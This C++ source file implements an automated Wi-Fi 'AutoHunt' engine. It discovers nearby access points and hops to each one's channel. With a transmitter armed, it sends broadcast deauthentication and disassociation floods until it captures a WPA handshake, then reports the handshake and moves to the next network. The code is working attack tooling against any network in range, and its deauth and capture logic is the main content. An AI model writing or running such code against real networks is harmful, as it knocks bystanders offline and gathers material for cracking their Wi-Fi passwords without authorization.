/**
 * @file hunt_engine.cpp
 * @brief Implementation of the endless-AutoHunt state machine (ADR-0015).
 */
#include "net/hunt_engine.h"

#include "core/deadline.h"  // reached(): the wrap-safe deadline test shared across clock-driven units.

namespace sapper {
namespace {

/// The collector needs a target at construction; the engine retargets it before the first capture, so
/// this all-zero placeholder is never actually hunted.
constexpr uint8_t kNoTarget[6] = {0, 0, 0, 0, 0, 0};

}  // namespace

HuntEngine::HuntEngine(RadioSniffer& sniffer, ApRegistry& registry, CaptureReadyObserver& observer,
                       const uint8_t* channels, size_t channelCount, const HuntConfig& config,
                       RawTransmitter* transmitter)
    : sniffer_(sniffer),
      registry_(registry),
      observer_(observer),
      transmitter_(transmitter),
      collector_(kNoTarget, 0),
      handshakeConsumer_(collector_),
      hopper_(channels, channelCount, config.dwellMs),
      config_(config) {}

bool HuntEngine::retuneTo(uint8_t channel) {
    if (!sniffer_.setChannel(channel)) return false;  // radio rejected it (e.g. country-restricted).
    parkedChannel_ = channel;
    registry_.setCurrentChannel(channel);  // fallback tracks only a confirmed retune (ADR-0013 #3).
    return true;
}

bool HuntEngine::begin(uint32_t nowMs) {
    hopper_.reset(nowMs);
    const uint8_t channel = hopper_.currentChannel();
    // Aim the router before begin(): the moment the sniffer installs us, onFrame may fire.
    activeSink_.store(&registry_, std::memory_order_release);
    if (!sniffer_.begin(channel, *this)) {
        activeSink_.store(nullptr, std::memory_order_release);
        phase_ = Phase::Idle;
        return false;
    }
    parkedChannel_ = channel;
    registry_.setCurrentChannel(channel);
    phase_ = Phase::Discovering;
    phaseDeadlineMs_ = nowMs + config_.discoverWindowMs;
    return true;
}

void HuntEngine::enterQuiesce(uint32_t nowMs, Resume resume) {
    // Aim the router away so no sink is written across the settle, then wait it out (ADR-0015 #4).
    activeSink_.store(nullptr, std::memory_order_release);
    resume_ = resume;
    quiesceUntilMs_ = nowMs + config_.settleMs;
    phase_ = Phase::Quiescing;
}

void HuntEngine::doEnterDiscovering(uint32_t nowMs) {
    // Reached only with the router aimed away (from a quiesce), so resetting the registry is safe.
    registry_.reset();
    hopper_.reset(nowMs);
    retuneTo(hopper_.currentChannel());  // a rejected first channel leaves the last parked one.
    activeSink_.store(&registry_, std::memory_order_release);
    phase_ = Phase::Discovering;
    phaseDeadlineMs_ = nowMs + config_.discoverWindowMs;
}

void HuntEngine::doStartCapturing(uint32_t nowMs) {
    // Reached only with the router aimed away (from a quiesce), so retargeting the collector is safe.
    while (targetIndex_ < targetCount_) {
        const DiscoveredAp& target = registry_.at(targetIndex_);
        if (retuneTo(target.channel)) {
            collector_.retarget(target.bssid, target.channel);
            activeSink_.store(&handshakeConsumer_, std::memory_order_release);
            phase_ = Phase::Capturing;
            phaseDeadlineMs_ = nowMs + config_.captureWindowMs;
            deauthDueMs_ = nowMs;  // armed: fire the first deauth burst on the first Capturing tick.
            return;
        }
        ++targetIndex_;  // radio rejected this target's channel — skip it, never capture off-channel.
    }
    doEnterDiscovering(nowMs);  // no capturable target remained; sweep afresh.
}

void HuntEngine::advanceTarget(uint32_t nowMs) {
    ++targetIndex_;
    if (targetIndex_ < targetCount_) {
        doStartCapturing(nowMs);
    } else {
        doEnterDiscovering(nowMs);  // whole enumeration cycled once; re-discover.
    }
}

void HuntEngine::tick(uint32_t nowMs) {
    switch (phase_) {
        case Phase::Idle:
            return;

        case Phase::Discovering: {
            if (hopper_.tick(nowMs)) retuneTo(hopper_.currentChannel());
            if (reached(nowMs, phaseDeadlineMs_)) {
                targetCount_ = registry_.count();  // snapshot; the table is append-only past here.
                targetIndex_ = 0;
                // Every phase change clears a sink, so it goes through one settle (ADR-0015 #4).
                enterQuiesce(nowMs, targetCount_ == 0 ? Resume::Discovering : Resume::CaptureFromIndex);
            }
            return;
        }

        case Phase::Capturing: {
            if (collector_.isWpaSecValid()) {
                enterQuiesce(nowMs, Resume::ReportThenAdvance);  // captured: stop deauthing, report.
            } else if (reached(nowMs, phaseDeadlineMs_)) {
                enterQuiesce(nowMs, Resume::AdvanceNoReport);
            } else {
                maybeTransmitDeauth(nowMs);  // still capturing this target: force reassociation (armed).
            }
            return;
        }

        case Phase::Quiescing: {
            if (!reached(nowMs, quiesceUntilMs_)) return;  // settle not yet elapsed.
            switch (resume_) {
                case Resume::Discovering:
                    doEnterDiscovering(nowMs);
                    return;
                case Resume::CaptureFromIndex:
                    doStartCapturing(nowMs);
                    return;
                case Resume::ReportThenAdvance:
                    // Safe read: the router is aimed away and settled, so no onFrame is mid-ingest.
                    observer_.onCaptureReady(collector_.handshake());
                    advanceTarget(nowMs);
                    return;
                case Resume::AdvanceNoReport:
                    advanceTarget(nowMs);
                    return;
            }
            return;
        }
    }
}

void HuntEngine::stop() {
    activeSink_.store(nullptr, std::memory_order_release);
    sniffer_.stop();
    phase_ = Phase::Idle;
}

void HuntEngine::onFrame(const uint8_t* frame, uint16_t len) {
    FrameConsumer* sink = activeSink_.load(std::memory_order_acquire);
    if (sink != nullptr) sink->onFrame(frame, len);
}

const uint8_t* HuntEngine::capturingBssid() const {
    if (phase_ != Phase::Capturing) return nullptr;
    return collector_.handshake().bssid;
}

void HuntEngine::maybeTransmitDeauth(uint32_t nowMs) {
    if (transmitter_ == nullptr) return;            // disarmed: passive hunt, transmit nothing (#16).
    if (!reached(nowMs, deauthDueMs_)) return;      // within the cadence gap — let the client reassociate.
    // Reached only from the Capturing branch, so the collector's target IS the parked AP: source and
    // BSSID = capturingBssid(), destination = broadcast (every client of that AP at once, no scanner).
    const uint8_t* bssid = collector_.handshake().bssid;
    transmitDeauthFrame(ManagementSubtype::Deauth, bssid);
    transmitDeauthFrame(ManagementSubtype::Disassoc, bssid);
    deauthDueMs_ = nowMs + config_.deauthIntervalMs;
}

void HuntEngine::transmitDeauthFrame(ManagementSubtype subtype, const uint8_t bssid[6]) {
    uint8_t frame[kDeauthFrameLen];
    const size_t len = buildDeauthFrame(frame, sizeof(frame), subtype, kBroadcastMac, bssid,
                                        DeauthReason::Class3FrameFromNonassoc);
    if (transmitter_->transmit(frame, static_cast<uint16_t>(len))) {
        ++deauthTxOk_;
    } else {
        ++deauthTxFail_;
    }
}

}  // namespace sapper
